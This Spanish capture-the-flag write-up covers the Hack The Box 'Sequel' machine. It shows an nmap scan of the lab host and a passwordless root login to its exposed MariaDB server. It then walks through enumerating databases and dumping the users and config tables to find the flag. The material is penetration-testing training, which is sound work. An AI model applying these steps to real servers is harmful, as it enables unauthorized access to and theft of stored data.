# Hack The Box - Sequel Writeup

![HTB](https://img.shields.io/badge/HackTheBox-Sequel-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Very_Easy-brightgreen?style=for-the-badge)

**Author:** Isaac Muñoz
**Date:** 2025-10-06
**Machine IP:** 10.129.95.232

---

## Introducción

Máquina con un servidor **MariaDB/MySQL** expuesto sin autenticación. El objetivo es conectarse, enumerar las bases de datos y extraer la flag de la tabla correcta.

---

## Enumeración de puertos abiertos con Nmap

```bash
nmap -sV -sC 10.129.95.232 -oN escaneo
```

- **-sV** — detectar versión de servicios
- **-sC** — ejecutar scripts por defecto de nmap

![](media/image1.png)

Se identifica el puerto **3306/tcp open** corriendo **MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1**.

Consultamos la ayuda del cliente MySQL para conocer los parámetros disponibles:

```bash
mysql --help
```

![](media/image2.png)

![](media/image3.png)

Parámetros clave:
- **-h** — especificar host/servidor
- **-u** — especificar usuario de login

---

## MySQL en Localhost (Referencia)

> Esta sección la incluyo como referencia o apunte, útil para futuras máquinas.

Activar el servicio MariaDB:

```bash
systemctl start mariadb
systemctl status mariadb
```

![](media/image4.png)

![](media/image5.png)

Acceder como root en local:

```bash
mysql -u root
```

![](media/image6.png)

Ver opciones disponibles dentro del cliente:

```bash
help
```

![](media/image7.png)

---

## Explotación

Conectarse al servidor remoto sin contraseña

```bash
mysql -h 10.129.95.232 -u root
```

El servidor acepta la conexión sin autenticación.

### Enumeración de bases de datos

```sql
SHOW DATABASES;
```

![](media/image8.png)

Se listan todas las bases de datos. HTB pedía identificar la **4ta base de datos** — `htb`.

### Acceder a la base de datos htb

```sql
USE htb;
```

![](media/image9.png)

### Listar tablas

```sql
SHOW TABLES;
```

![](media/image10.png)

### Extraer datos de las tablas

```sql
SELECT * FROM users;
```

![](media/image11.png)

```sql
SELECT * FROM config;
```

![](media/image12.png)

---

## Flag

Revisando los campos de la tabla **config** se encuentra la **flag** de HackTheBox.

